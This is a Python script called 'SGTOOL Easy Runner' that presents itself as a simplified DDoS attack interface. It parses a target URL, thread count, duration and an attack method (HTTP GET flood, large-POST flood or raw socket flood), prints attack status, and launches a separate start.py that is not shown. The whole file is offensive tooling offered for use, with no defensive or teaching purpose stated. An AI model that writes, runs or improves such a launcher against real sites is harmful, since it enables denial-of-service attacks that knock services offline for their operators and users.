#!/usr/bin/env python3

import sys
import argparse
import asyncio
import subprocess
import platform
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

# ASCII Art Banner
def print_banner():
    banner = f"""
    {Fore.CYAN}███████╗ ██████╗ {Fore.RED}████████╗ ██████╗  ██████╗ ██╗     
    {Fore.CYAN}██╔════╝██╔════╝ {Fore.RED}╚══██╔══╝██╔═══██╗██╔═══██╗██║     
    {Fore.CYAN}███████╗██║  ███╗{Fore.RED}   ██║   ██║   ██║██║   ██║██║     
    {Fore.CYAN}╚════██║██║   ██║{Fore.RED}   ██║   ██║   ██║██║   ██║██║     
    {Fore.CYAN}███████║╚██████╔╝{Fore.RED}   ██║   ╚██████╔╝╚██████╔╝███████╗
    {Fore.CYAN}╚══════╝ ╚═════╝ {Fore.RED}   ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝
    """
    print(banner)
    print(f"     {Fore.YELLOW}Ὂ5 EASY RUNNER - Simplified Attack Interface Ὂ5\n")

def main():
    parser = argparse.ArgumentParser(
        description="SGTOOL Easy Runner - Simplified DDoS Attack Interface",
        formatter_class=argparse.RawTextHelpFormatter
    )
    
    parser.add_argument(
        "target",
        nargs="?",
        type=str,
        help="Target URL (e.g., example.com)"
    )
    
    parser.add_argument(
        "--time", "-t",
        type=int,
        default=60,
        help="Attack duration in seconds (default: 60)"
    )
    
    parser.add_argument(
        "--threads", "-n",
        type=int,
        default=100,
        help="Number of threads (default: 100)"
    )
    
    parser.add_argument(
        "--method", "-m",
        type=str,
        choices=["HTTP", "POST", "SOCKET"],
        help="Force specific attack method"
    )
    
    parser.add_argument(
        "--help-methods",
        action="store_true",
        help="Show information about attack methods"
    )
    
    # Check for no arguments
    if len(sys.argv) == 1:
        parser.print_help()
        return
    
    args = parser.parse_args()
    
    # Print banner
    print_banner()
    
    # Show methods info if requested
    if args.help_methods:
        print(f"\n{Fore.CYAN}Available Attack Methods:")
        print(f"{Fore.YELLOW}HTTP   - {Fore.GREEN}HTTP Flood attack using GET requests. Good for most websites.")
        print(f"{Fore.YELLOW}POST   - {Fore.GREEN}HTTP Flood attack with large POST data. More powerful against web apps.")
        print(f"{Fore.YELLOW}SOCKET - {Fore.GREEN}Raw socket flood attack. Effective against non-HTTP services.")
        return
    
    # Check for target URL
    if not args.target:
        print(f"\n{Fore.RED}[!] Error: Target URL is required.")
        parser.print_help()
        return
    
    # Validate arguments
    if args.threads < 1:
        print(f"\n{Fore.RED}[!] Error: Threads must be at least 1.")
        return
    
    if args.time < 1:
        print(f"\n{Fore.RED}[!] Error: Time must be at least 1 second.")
        return
    
    # Build the command to execute
    cmd = ["python", "start.py"]
    
    # Add method
    if args.method:
        print(f"Selected method: {args.method}")
        cmd.extend(["-m", args.method])
    else:
        print("Detecting best attack method...")
        cmd.extend(["-m", "AUTO"])
    
    # Add target
    cmd.append(args.target)
    
    # Add threads
    cmd.extend(["-t", str(args.threads)])
    
    # Add duration
    cmd.extend(["-d", str(args.time)])
    
    # Print attack details
    method = args.method if args.method else "AUTO"
    print(f"\nStarting attack on {args.target}")
    print(f"Method: {method}")
    print(f"Threads: {args.threads}")
    print(f"Duration: {args.time} seconds\n")
    print("Press Ctrl+C to stop the attack\n")
    
    # Run the attack
    try:
        subprocess.run(cmd)
    except KeyboardInterrupt:
        print(f"\n\n{Fore.YELLOW}[!] Attack interrupted by user\n")
        print(f"{Fore.GREEN}[+] Attack completed\n")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Fore.YELLOW}[!] Program interrupted by user\n")
